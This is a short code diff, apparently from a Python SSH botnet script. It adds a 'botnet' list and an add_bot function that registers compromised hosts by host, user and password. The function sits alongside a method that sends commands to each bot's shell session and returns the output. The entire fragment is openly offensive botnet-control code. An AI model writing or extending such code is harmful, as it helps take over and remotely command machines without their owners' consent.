@@ -33,3 +33,16 @@ def send_command(self, cmd)
     self.session.sendline(cmd)
     self.session.prompt()
     return self.session.before
+# list of bots in botnet
+
+botnet = []
+
+
+
+# add a new bot to your botnet by mang0
+
+def add_bot(host, user, password):
+
+    new_bot = Bot(host, user, password)
+
+    botnet.append(new_bot)
